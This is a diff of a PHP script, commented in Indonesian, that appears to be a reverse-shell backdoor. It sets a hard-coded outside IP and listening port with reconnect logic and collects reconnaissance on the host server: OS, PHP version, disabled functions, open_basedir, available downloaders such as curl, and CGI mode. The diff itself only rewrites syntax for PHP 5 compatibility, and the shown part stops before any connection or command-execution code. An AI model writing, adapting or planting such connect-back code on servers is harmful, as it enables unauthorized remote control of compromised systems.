@@ -1,8 +1,8 @@
 <?php
 // Konfigurasi
-$target_ip = "103.125.43.187"; // Ganti dengan IP client Anda
-$target_port = 2012;           // Port yang Anda dengarkan di client
-$reconnect_interval = 5;       // Interval reconnect (detik)
+ $target_ip = "103.125.43.187"; // Ganti dengan IP client Anda
+ $target_port = 2012;           // Port yang Anda dengarkan di client
+ $reconnect_interval = 5;       // Interval reconnect (detik)
 
 // Fungsi untuk mendapatkan informasi sistem
 function get_system_info() {
@@ -20,8 +20,8 @@ function get_system_info() {
     $info['php_version'] = phpversion();
     $info['safe_mode'] = ini_get('safe_mode') ? 'ON' : 'OFF';
     
-    // IP Server
-    $info['server_ip'] = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
+    // IP Server (kompatibel PHP 5)
+    $info['server_ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
     
     // DateTime
     $info['datetime'] = date('Y-m-d H:i:s');
@@ -56,7 +56,7 @@ function get_system_info() {
     if (is_executable('/usr/bin/curl') || is_executable('/bin/curl')) {
         $downloader[] = "curl";
     }
-    $info['downloader'] = implode(' ', $downloader) ?: "None";
+    $info['downloader'] = count($downloader) > 0 ? implode(' ', $downloader) : "None";
     
     // Disable Functions
     $disable_functions = ini_get('disable_functions');
@@ -73,12 +73,12 @@ function get_system_info() {
     $info['cgi_status'] = strpos(php_sapi_name(), 'cgi') !== false ? "ON" : "OFF";
     
     // Open_basedir, etc.
-    $info['open_basedir'] = ini_get('open_basedir') ?: "NONE";
-    $info['safe_mode_exec_dir'] = ini_get('safe_mode_exec_dir') ?: "NONE";
-    $info['safe_mode_include_dir'] = ini_get('safe_mode_include_dir') ?: "NONE";
+    $info['open_basedir'] = ini_get('open_basedir') ? ini_get('open_basedir') : "NONE";
+    $info['safe_mode_exec_dir'] = ini_get('safe_mode_exec_dir') ? ini_get('safe_mode_exec_dir') : "NONE";
+    $info['safe_mode_include_dir'] = ini_get('safe_mode_include_dir') ? ini_get('safe_mode_include_dir') : "NONE";
     
     // Software Web Server
-    $info['software'] = $_SERVER['SERVER_SOFTWARE'] ?? "Unknown";
+    $info['software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : "Unknown";
     
     return $info;
 }
